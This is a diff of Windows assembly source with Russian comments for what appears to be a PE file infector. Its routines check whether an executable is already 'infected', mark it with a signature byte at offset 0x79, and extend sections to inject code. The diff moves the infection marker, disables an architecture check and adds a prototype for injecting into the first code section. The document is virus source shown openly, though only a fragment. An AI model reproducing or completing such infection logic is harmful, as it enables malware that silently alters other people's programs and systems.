@@ -23,6 +23,11 @@ option casemap:none
 include windows.inc
 
 
+;---------------------MACRO-------------
+
+INJ_SIGN_OFFSET equ 079h
+INJECTION_SIGN 	equ 050h
+
 ifdef _WIN64
 	CLIST_ENTRY typedef LIST_ENTRY64
 	; машинное слово текущей архитектуры
@@ -59,7 +64,7 @@ else
 	cur_seg_reg equ <fs>
 endif 
 
-INJECTION_FLAG equ 011h
+
 
 PeParser struct
     filename 	cword   ?   ;имя файла
@@ -186,6 +191,7 @@ UnloadPeFile proto stdcall pe:ptr byte
 AlignToTop proto stdcall :cword, :cword
 
 ExtendLastSection proto stdcall :ptr byte, :cword, :ptr byte, :ptr byte
+ExtendFirstCodeSection proto stdcall :ptr byte, :cword, :ptr byte, :ptr byte ;  
 
 CheckPeFile proto stdcall :ptr byte
 InjectPeFile proto stdcall :ptr byte
@@ -972,26 +978,26 @@ ExtendLastSection endp
 
 ;
 ; проверяет, заражён ли файл, и его разрядность
-; @param pe 	проверяемый pe-файл
-; @return 		0 - НЕ заражен и разрядность такая же, 1 - заражен или разрядность другая
+; 
 ; 
 CheckPeFile proc stdcall uses cdi csi pe:ptr byte	
 	; cdi = pe
 	mov cdi, [pe]
-    assume cdi: ptr PeParser	
-	; csi = pe->nthead
-	mov csi, [cdi].nthead
-    assume csi: ptr IMAGE_NT_HEADERS
-	
+    assume cdi: ptr PeParser
+	mov csi, [cdi].mem
+	assume cdi: nothing
+
+	lea csi, [csi + INJ_SIGN_OFFSET] ; ADDR SIGN
+
     invoke sc_printf, addr [cbx + strFormat], addr [cbx + strCheckPeFile]
 	
-	.if [csi].FileHeader.Machine != PROC_VERSION
-		mov cax, 1
-		ret
-	.endif
+	; .if [csi].FileHeader.Machine != PROC_VERSION
+		; mov cax, 1
+		; ret
+	; .endif
 	
-	; проверяем, внедрялись ли уже в этот файл
-	.if [csi].OptionalHeader.MajorLinkerVersion == INJECTION_FLAG
+	; проверка сигнатуры
+	.if byte ptr [csi] == INJECTION_SIGN
 		mov cax, 1
 		ret
 	.endif
@@ -999,9 +1005,10 @@ CheckPeFile proc stdcall uses cdi csi pe:ptr byte
     invoke sc_printf, addr [cbx + strFormat], addr [cbx + strPeFileWillBeInjected]
 	
 	; Этот файл будем заражать - возвращаем 0
-	mov [csi].OptionalHeader.MajorLinkerVersion, INJECTION_FLAG	
+	mov byte ptr [csi], INJECTION_SIGN	
 	xor cax, cax
 	ret
+	
 CheckPeFile endp 
 
 ; Внедряет данные и код в новую область памяти в файле.
@@ -1024,7 +1031,8 @@ InjectPeFile proc stdcall uses cdi csi pe:ptr byte
 	
     ; расширяем последнюю секцию
     ; ExtendLastSection (pe, 2 * sizeof(DWORD) + codeSize + ((DWORD)InjectCode - (DWORD)InjectedCode), &rvaNewData, &offsetNewData);
-	invoke ExtendLastSection, [pe], sc_end - sc_start, addr [rvaNewData], addr [offsetNewData]
+	;invoke ExtendLastSection, [pe], sc_end - sc_start, addr [rvaNewData], addr [offsetNewData]
+	
 	
 	; cdi = pe
 	mov cdi, [pe]
